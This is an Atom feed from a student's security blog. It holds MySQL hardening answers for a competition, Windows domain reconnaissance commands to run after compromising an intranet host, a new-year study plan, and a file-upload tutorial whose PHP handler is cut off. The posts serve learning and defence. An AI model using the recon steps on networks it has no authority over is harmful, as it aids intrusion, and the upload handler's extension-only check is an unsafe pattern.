<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zilong&#39;s Blog</title>
  <subtitle>前行，永不止步，</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.izilong.net/"/>
  <updated>2017-02-27T01:26:11.000Z</updated>
  <id>http://blog.izilong.net/</id>
  
  <author>
    <name>Zilong</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据库攻防与加固</title>
    <link href="http://blog.izilong.net/2017/02/26/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>http://blog.izilong.net/2017/02/26/MySQL数据库安全加固/</id>
    <published>2017-02-26T13:21:18.000Z</published>
    <updated>2017-02-27T01:26:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>某比赛样题。</p>
<h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>进入xserver-mysql，加固MySQL服务器，使所有的访问能被审计，要求通过对mysqld的启动项进行加固。</p>
<p>本题考点是“所有的访问能被审计”。</p>
<p>针对于mysql，基于init-connect+binlog可以完成审计功能。<br><a id="more"></a></p>
<h3 id="init-connect-binlog建立过程"><a href="#init-connect-binlog建立过程" class="headerlink" title="init-connect+binlog建立过程"></a>init-connect+binlog建立过程</h3><ol>
<li>建立数据表，用来存储相关信息。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">create database AuditDB default charset utf8;</div><div class="line">use AuditDB;</div><div class="line">create table accesslog (</div><div class="line">ID int primary key auto_increment,</div><div class="line">ConnectionID int,</div><div class="line">ConnUserName varchar(30), </div><div class="line">PrivMatchName varchar(30), </div><div class="line">LoginTIme timestamp);</div></pre></td></tr></table></figure>
<p><strong>注意，以后每添加一个用户都必须授权此表的插入权限，否则会连接不上mysql。</strong></p>
<ol>
<li>赋予所有用户对AuditDB数据库的写权限。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">insert into db (Host,Db,User,Insert_priv) values (&apos;%&apos;,&apos;AuditDB&apos;,&apos;&apos;,&apos;Y&apos;);</div><div class="line">flush privileges;</div></pre></td></tr></table></figure>
<ol>
<li>设置init_connect、log-bin并重启mysql服务</li>
</ol>
<p>编辑MySQL的配置文件，/etc/mysql/my.conf，在[mysqld]下面添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">init-connect=&apos;insert into AuditDB.accesslog (ConnectionID,ConnUserName,PrivMatchName,LoginTime) values(connection_id(),user(),current_user(),now());&apos;</div><div class="line"></div><div class="line">log-bin=mysqlbin-log</div></pre></td></tr></table></figure>
<p>最后重启mysql服务： <code>service mysql restart</code></p>
<p>log-bin 参数设置的是MySQL生成的日志前缀，目录为：<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fd47ffdog8j30ry07qdid.jpg" alt=""></p>
<p>每一次登陆，会生成一个二进制文件，需要用mysqlbinlog去查看，如图：<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fd47gl9qkcj31ic0l0qa0.jpg" alt=""></p>
<p>至此设置完成。</p>
<h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><p>比如想查看谁插入了一条带有world关键词的记录。<br>mysqlbinlog mysqlbin-log.000005</p>
<p><img src="https://ww3.sinaimg.cn/large/006tNbRwly1fd47kk6f0xj315805u3zq.jpg" alt=""></p>
<p>获得thread_id。<br>查询数据库审计表中的记录：<br><img src="https://ww2.sinaimg.cn/large/006tNbRwly1fd47mvsjkqj30w607mwg4.jpg" alt=""><br>可知是zeal用户添加了一条带有关键词<code>world</code>的数据。</p>
<p><strong>*注意，此方法只能审计非super权限用户的操作</strong></p>
<h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>配置Linux防火墙，允许MySQL服务能够被访问，要求规则中只包含端口项。</p>
<p>本题考查Linux下防火墙的使用。</p>
<p>MySQL的服务端口默认为3306端口，在防火墙上对3306端口启用ACCEPT规则即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/sbin/iptables -I INPUT -p tcp --dport 3306 -j ACCEPT</div><div class="line">/etc/rc.d/init.d/iptables save</div><div class="line">/etc/init.d/iptables status</div></pre></td></tr></table></figure>
<h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p>进入xserver-mysql，查看所有用户及权限，找到可以从任何IP的值访问的用户。</p>
<p>本题考查mysql用户相关信息的查询。</p>
<p>在MySQL中，用户的信息存储在mysql数据库的user表中。host列为用户可登陆的地址。<code>%</code>为任意地址。</p>
<p><code>select user,host from mysql.user</code></p>
<p><img src="https://ww3.sinaimg.cn/large/006tNbRwly1fd483t058kj30fo0cm0tz.jpg" alt=""></p>
<h2 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h2><p>对题号3中的漏洞进行加固，核定该用户只能从公司PC-1使用，用grant命令进行管理。</p>
<p>本题考查MySQL中，用grant管理用户的知识。</p>
<p>登陆root用户。</p>
<p><code>grant all privileges on *.* to sdust@xxx.xxx.xxx.xxx identified by &#39;passowrd&#39;;</code></p>
<p>xxx.xxx.xxx.xxx 为PC-1的IP地址。</p>
<h2 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h2><p>检查xserver-mysql中是否存在数据库匿名用户，如果存在数据库匿名用户，则删除该用户。</p>
<p>本题考查MySQL数据库中匿名用户相关知识。</p>
<h3 id="匿名用户："><a href="#匿名用户：" class="headerlink" title="匿名用户："></a>匿名用户：</h3><p>安装完MySQL以后会自动创建一个root用户和一个匿名用户，对于root大家都非常注意，而这个匿名用户很多人都会忽略，大概是因为匿名用户默认设定为只能在本地使用的缘故吧。 </p>
<p>但匿名用户几乎拥有与root一样的权限，当网站被入侵，黑客找不到root的密码，可以通过匿名用户，实现与root权限相同的功能，进行提权。</p>
<p><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fd48eu0hdjj30hs0e8gn4.jpg" alt=""></p>
<h3 id="删除方法"><a href="#删除方法" class="headerlink" title="删除方法"></a>删除方法</h3><p><code>delete from mysql.user where user=&#39;&#39;;</code></p>
<p><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fd48hwsvsoj30i00g8abw.jpg" alt=""></p>
<h2 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h2><p>改变MySQL管理员的名称，将系统的默认管理员root改为admin。</p>
<p><code>update mysql.user set user=&#39;admin&#39; where user=&#39;root&#39;;</code><br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fd48jxx58wj30og0va426.jpg" alt=""></p>
<h2 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h2><p>禁止MySQL对本地文件进行存取，对mysqld的启动项进行加固。</p>
<p>本题考查利用MySQL数据库对服务器当中的文件进行存取的知识。</p>
<p>一般，黑客可通过root权限的注入点，去写shell（into outfile），或者读取服务器中的文件内容（load data）。</p>
<p><img src="https://ww3.sinaimg.cn/large/006tNbRwly1fd48q4bpxpj30nw0a475r.jpg" alt=""></p>
<p>利用local-infile=0可以禁止对本地文件的存取。<br>将local-infile=0加入MySQL配置文件，mysqld下即可。</p>
<h2 id="题目8"><a href="#题目8" class="headerlink" title="题目8"></a>题目8</h2><p>限制一般用户浏览其他用户数据库，对mysqld的启动项进行加固。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;某比赛样题。&lt;/p&gt;
&lt;h2 id=&quot;题目1&quot;&gt;&lt;a href=&quot;#题目1&quot; class=&quot;headerlink&quot; title=&quot;题目1&quot;&gt;&lt;/a&gt;题目1&lt;/h2&gt;&lt;p&gt;进入xserver-mysql，加固MySQL服务器，使所有的访问能被审计，要求通过对mysqld的启动项进行加固。&lt;/p&gt;
&lt;p&gt;本题考点是“所有的访问能被审计”。&lt;/p&gt;
&lt;p&gt;针对于mysql，基于init-connect+binlog可以完成审计功能。&lt;br&gt;
    
    </summary>
    
      <category term="安全加固" scheme="http://blog.izilong.net/categories/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    
    
      <category term="数据库安全" scheme="http://blog.izilong.net/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
      <category term="mysql" scheme="http://blog.izilong.net/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>域渗透知识整理(2)</title>
    <link href="http://blog.izilong.net/2017/02/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86-2/"/>
    <id>http://blog.izilong.net/2017/02/14/域渗透基础知识整理-2/</id>
    <published>2017-02-14T14:27:31.000Z</published>
    <updated>2017-03-11T08:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判定是否在域内"><a href="#判定是否在域内" class="headerlink" title="判定是否在域内"></a>判定是否在域内</h2><p>拿下内网当中的一台主机后，首先要判断所控主机是否在域内。这里记录集中验证的方法。</p>
<h3 id="net-time-domain"><a href="#net-time-domain" class="headerlink" title="net time /domain"></a>net time /domain</h3><ul>
<li>存在域不确定，但当前用户不是域用户。<br><img src="https://ww3.sinaimg.cn/large/006tKfTcly1fcy36pj0bbj30pi046t95.jpg" alt=""></li>
<li><p>存在域，且当前用户是域用户会从域控返回当前时间。<br><img src="https://ww4.sinaimg.cn/large/006tKfTcly1fcy38y21ycj30ou050gm8.jpg" alt=""></p>
</li>
<li><p>不存在域。<br><img src="https://ww1.sinaimg.cn/large/006tKfTcly1fcy3e8wjx6j30k804omxt.jpg" alt=""></p>
<a id="more"></a>
<h3 id="net-config-workstation"><a href="#net-config-workstation" class="headerlink" title="net config workstation"></a>net config workstation</h3></li>
</ul>
<p><img src="https://ww3.sinaimg.cn/large/006tKfTcly1fcy3a07910j30wo0jsgon.jpg" alt=""></p>
<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p><img src="https://ww4.sinaimg.cn/large/006tKfTcly1fcy3atdktaj30m60k4dk3.jpg" alt=""></p>
<h3 id="ipconfig-all"><a href="#ipconfig-all" class="headerlink" title="ipconfig /all"></a>ipconfig /all</h3><p><img src="https://ww1.sinaimg.cn/large/006tKfTcly1fcy3bjh0yaj30z00kgwhm.jpg" alt=""></p>
<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><ul>
<li><p>net user /domain 查看域用户<br><img src="https://ww1.sinaimg.cn/large/006tKfTcly1fcy404bzfhj30we09ujso.jpg" alt=""></p>
</li>
<li><p>net view /domain 查看有几个域<br><img src="https://ww3.sinaimg.cn/large/006tKfTcly1fcy40g2dogj30rs05u74s.jpg" alt=""></p>
</li>
<li><p>net view /domain:XXX 查看此域内电脑<br><img src="https://ww4.sinaimg.cn/large/006tKfTcly1fcy40xok5nj30rm07e3z8.jpg" alt=""></p>
</li>
<li><p>net group /domain 查询域里面的组<br><img src="https://ww4.sinaimg.cn/large/006tKfTcly1fcy41h72l7j30pu0jyjts.jpg" alt=""></p>
</li>
<li><p>net group “domain computers” /domain 查看加入到域内的所有计算机名<br><img src="https://ww2.sinaimg.cn/large/006tKfTcly1fcy4420n5gj30w00a8ta8.jpg" alt=""></p>
</li>
<li><p>net group “domain admins” /domain 查看域管理员<br><img src="https://ww1.sinaimg.cn/large/006tKfTcly1fcy44wp46ej30w00aeq4d.jpg" alt=""></p>
</li>
<li><p>net group “domain controllers” /domain 查看域控制器<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fdizt5924gj30jj06bzku.jpg" alt=""></p>
</li>
<li><p>net user hacker /domain 获得指定账户的详细信息<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fcy4bfhbeoj30r20qq0w7.jpg" alt=""></p>
</li>
<li><p>net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fcy4bwkxyyj30q00coq5d.jpg" alt=""></p>
</li>
</ul>
<p>以上命令都是最简单的获取信息命令，只能获取最基本的信息。</p>
<p>更详细的信息需要用到其他的工具和利用姿势。以后再慢慢写。</p>
<p>##本地用户与域用户<br>拿到一台主机权限后，有两种可能:</p>
<ol>
<li>本地用户<br><img src="https://ww2.sinaimg.cn/large/006tNbRwly1fcyxzj5v1aj30na02u3yt.jpg" alt=""></li>
<li>域用户<br><img src="https://ww1.sinaimg.cn/large/006tNbRwly1fcyy0vd0jkj30mg02ojrm.jpg" alt=""><br>一般本地用户的administrator可以直接提升为ntauthority\system，SYSTEM用户权限。</li>
</ol>
<p>在这三种情况中，本地用户是无法运行之前说的所有命令的，因为本质上所有查询都是通过ldap协议去域控制器上查询，这个查询需要经 过权限认证，只有域用户才有这个权限。当域用户运行查询命令时，会自动使用kerberos协议认证，无需额外输入账号密码。SYSTEM用户的情况比较特殊，在域中，除了普通用户外，所有机器都有一个机器用户，用户名是机器名后加$，本 质上机器上的SYSTEM用户对应的就是域里面的机器用户，所以SYSTEM权限是可以运行之前说的查询命令的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;判定是否在域内&quot;&gt;&lt;a href=&quot;#判定是否在域内&quot; class=&quot;headerlink&quot; title=&quot;判定是否在域内&quot;&gt;&lt;/a&gt;判定是否在域内&lt;/h2&gt;&lt;p&gt;拿下内网当中的一台主机后，首先要判断所控主机是否在域内。这里记录集中验证的方法。&lt;/p&gt;
&lt;h3 id=&quot;net-time-domain&quot;&gt;&lt;a href=&quot;#net-time-domain&quot; class=&quot;headerlink&quot; title=&quot;net time /domain&quot;&gt;&lt;/a&gt;net time /domain&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;存在域不确定，但当前用户不是域用户。&lt;br&gt;&lt;img src=&quot;https://ww3.sinaimg.cn/large/006tKfTcly1fcy36pj0bbj30pi046t95.jpg&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;存在域，且当前用户是域用户会从域控返回当前时间。&lt;br&gt;&lt;img src=&quot;https://ww4.sinaimg.cn/large/006tKfTcly1fcy38y21ycj30ou050gm8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不存在域。&lt;br&gt;&lt;img src=&quot;https://ww1.sinaimg.cn/large/006tKfTcly1fcy3e8wjx6j30k804omxt.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://blog.izilong.net/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="域渗透" scheme="http://blog.izilong.net/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hello,2017</title>
    <link href="http://blog.izilong.net/2017/02/07/hello-2017/"/>
    <id>http://blog.izilong.net/2017/02/07/hello-2017/</id>
    <published>2017-02-07T07:53:32.000Z</published>
    <updated>2017-02-13T02:02:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>时间刷刷刷的就没了。。。</p>
<p>转眼就大三下学期了，讲真，真没学到太多东西，跟自己预想的差太多了。剩下的时间得加倍努力了。计划归计划，就像我皓说的，列老多计划根本没什么用，不知道啥时候来件什么事，就打乱计划。想想也有一定的道理。但是吧，为了督促自己，时不时来看看自己年初列的计划，敲敲警钟，计划还是得有的。万一就超额完成任务了呢。。。<br><a id="more"></a></p>
<ol>
<li>精通docker。</li>
<li>利用docker，把自己想做的东西，做出来个框架。</li>
<li>多写php，多看php经典漏洞，多审php代码。</li>
<li>多用python写东西。</li>
<li>除了Web，继续学习内网渗透的相关知识。</li>
<li>加强Linux。</li>
<li>跟着师傅们多挖洞。</li>
<li>多看技术以外的书（管理、文学）。</li>
</ol>
<p>大学就要多读书，然而大学貌似技术没学好，其他的也没怎么搞，书也没看基本。。。</p>
<p>大学还有时间，要更努力。fighting</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;时间刷刷刷的就没了。。。&lt;/p&gt;
&lt;p&gt;转眼就大三下学期了，讲真，真没学到太多东西，跟自己预想的差太多了。剩下的时间得加倍努力了。计划归计划，就像我皓说的，列老多计划根本没什么用，不知道啥时候来件什么事，就打乱计划。想想也有一定的道理。但是吧，为了督促自己，时不时来看看自己年初列的计划，敲敲警钟，计划还是得有的。万一就超额完成任务了呢。。。&lt;br&gt;
    
    </summary>
    
      <category term="others" scheme="http://blog.izilong.net/categories/others/"/>
    
    
      <category term="计划" scheme="http://blog.izilong.net/tags/%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>ajaxfileupload异步上传</title>
    <link href="http://blog.izilong.net/2017/02/04/ajaxfileupload%E5%BC%82%E6%AD%A5%E4%B8%8A%E4%BC%A0/"/>
    <id>http://blog.izilong.net/2017/02/04/ajaxfileupload异步上传/</id>
    <published>2017-02-04T07:11:27.000Z</published>
    <updated>2017-02-04T08:00:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近一直抽时间写小组的宣传网站，用的thinkphp框架，找了个前端模板。本来想动手写thinkphp练练手，没想到…</p>
<p>因为前端都不行，就随便找了个模板，自己拼拼凑凑。头像上传的功能，模板里没有，因为自己太渣，只能在网上找现成的，尝试了几个插件，最终用ajaxfileupload实现了需求。</p>
<p>这里记录一下今天上午踩得坑吧。看的那篇文章，好多坑，坑死了…</p>
<a id="more"></a>
<h2 id="ajaxfileupload"><a href="#ajaxfileupload" class="headerlink" title="ajaxfileupload"></a>ajaxfileupload</h2><p>ajaxfileupload是ajax的一个插件，用于实现异步上传。可以实现不刷新页面的请款下，本地预览图片，post到后台的功能。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="首先引用js文件"><a href="#首先引用js文件" class="headerlink" title="首先引用js文件"></a>首先引用js文件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"jquery-1.11.3.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"ajaxfileupload.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="div内使用"><a href="#div内使用" class="headerlink" title="div内使用"></a>div内使用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pop pageSetting"</span> &gt;</span></div><div class="line">    <span class="comment">&lt;!-- 修改头像 --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"changeUserPic"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"preview"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"previewPic"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"choosePic"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"Filedata"</span> <span class="attr">name</span>=<span class="string">"Filedata"</span> <span class="attr">class</span>=<span class="string">"UploadImg"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> &gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"clear"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"savePicture"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"canclePicture"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void"</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//上传头像预览  </span></div><div class="line">$(<span class="string">'.choosePic'</span>).on(<span class="string">'change'</span>, <span class="string">'.UploadImg'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </div><div class="line">    <span class="keyword">var</span> file = <span class="keyword">this</span>.files[<span class="number">0</span>];        </div><div class="line"></div><div class="line">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();     </div><div class="line">    reader.readAsDataURL(file);     </div><div class="line">    reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;     </div><div class="line">        $(<span class="string">'.previewPic img'</span>).attr(<span class="string">'src'</span>,<span class="keyword">this</span>.result) <span class="comment">//图片base64编码后显示  </span></div><div class="line">    &#125;   </div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这里使用了jQuery的FileReader方法，其readAsDataURL方法用于读取指定Blob或File的内容。当读操作完成，readyState变为DONE, loadend被触发，此时result属性包含数据：URL以base64编码的字符串表示文件的数据。只要点击了上面的“浏览”按钮并选择了图片文件，就会在指定的位置生成预览。（注意这里只是在本地预览，并没有上传到服务器上）</p>
<p><img src="https://ww2.sinaimg.cn/large/006y8lValy1fcegz76ng3j31aw0qe42y.jpg" alt=""></p>
<h3 id="使用ajaxfileupload上传"><a href="#使用ajaxfileupload上传" class="headerlink" title="使用ajaxfileupload上传"></a>使用ajaxfileupload上传</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//正式上传头像--使用ajaxfileupload.js上传</span></div><div class="line">$(<span class="string">'.savePicture'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $.ajaxFileUpload(&#123;</div><div class="line">        <span class="attr">url</span>: <span class="string">'admin.php?a=img_handle'</span>,</div><div class="line">        <span class="attr">type</span>: <span class="string">'post'</span>,</div><div class="line">        <span class="attr">secureuri</span>: <span class="literal">false</span>, <span class="comment">//一般设置为false</span></div><div class="line">        fileElementId: <span class="string">'Filedata'</span>, <span class="comment">// 上传文件的id、name属性名</span></div><div class="line">        dataType: <span class="string">'JSON'</span>, <span class="comment">//必须使用大写！否则不能操作数据</span></div><div class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</div><div class="line">            data  = <span class="built_in">JSON</span>.parse(list); <span class="comment">//JSON解析</span></div><div class="line">            <span class="keyword">var</span> errCode = data.codeNum;<span class="comment">//codeNum为服务端返回的数据</span></div><div class="line">            <span class="keyword">var</span> errMsg  = data.msg;</div><div class="line">            <span class="keyword">var</span> path = data.path;</div><div class="line">            <span class="comment">//errCode为0、1、2、3、5、6均为上传不成功</span></div><div class="line">            <span class="keyword">if</span>(errCode==<span class="number">0</span>||errCode==<span class="number">1</span>||errCode==<span class="number">2</span>||errCode==<span class="number">3</span>||errCode==<span class="number">5</span>||errCode==<span class="number">6</span>)&#123;</div><div class="line">                $(<span class="string">'.choosePic span'</span>).html(errMsg);</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125; <span class="keyword">else</span>&#123;</div><div class="line">                $(<span class="string">'.choosePic span'</span>).html(path);</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">        <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data, status, e</span>)</span>&#123;</div><div class="line">            alert(e)</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>在这里，当出发上面的保存按钮时，边开始执行ajaxfileupload进行图片异步上传，其中success后的函数代表成功上传后要做的操作，error后的函数可以将错误信息弹出，方便调试（建议正式上线之后去掉）。</p>
<p>这里踩了博主的坑。。。JSON必须大写，否则不能操作数据。<br>其次，返回json之后，需要解析，才可以取状态码，提示信息，图片相对地址等信息。</p>
<h3 id="后台处理php"><a href="#后台处理php" class="headerlink" title="后台处理php"></a>后台处理php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//设置图片要上传保存到服务器的绝对路径</span></div><div class="line">$path = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/team_web/Public/UserPicture/'</span>;</div><div class="line"><span class="comment">//图片显示的路径</span></div><div class="line">$showPath = <span class="string">''</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'Filedata'</span>]))&#123;</div><div class="line">    <span class="comment">//若上传错误，则弹出错误id</span></div><div class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'Filedata'</span>][<span class="string">'error'</span>] &gt; <span class="number">0</span>)&#123;</div><div class="line">        $resultCode = <span class="number">0</span>;</div><div class="line">        $resultMsg  = <span class="string">'错误代码：'</span>.$_FILES[<span class="string">'Filedata'</span>][<span class="string">'error'</span>];</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>($_FILES[<span class="string">'Filedata'</span>][<span class="string">'size'</span>] &gt; (<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</div><div class="line">        $resultCode = <span class="number">1</span>;</div><div class="line">        $resultMsg  = <span class="string">'上传照片请不要大于2M'</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $division = pathinfo($_FILES[<span class="string">'Filedata'</span>][<span class="string">'name'</span>]);</div><div class="line">        $extensionName = $division[<span class="string">'extension'</span>];  <span class="comment">//获取文件扩展名</span></div><div class="line">        <span class="comment">//如果上传文件不是图片，则不保存</span></div><div class="line">        <span class="keyword">if</span>( !in_array($extensionName, <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>)))&#123;</div><div class="line">            $resultCode = <span class="number">2</span>;</div><div class="line">            $resultMsg  = <span class="string">'错误：只可以上传图片'</span>;</div><div class="line">        &#125; <span 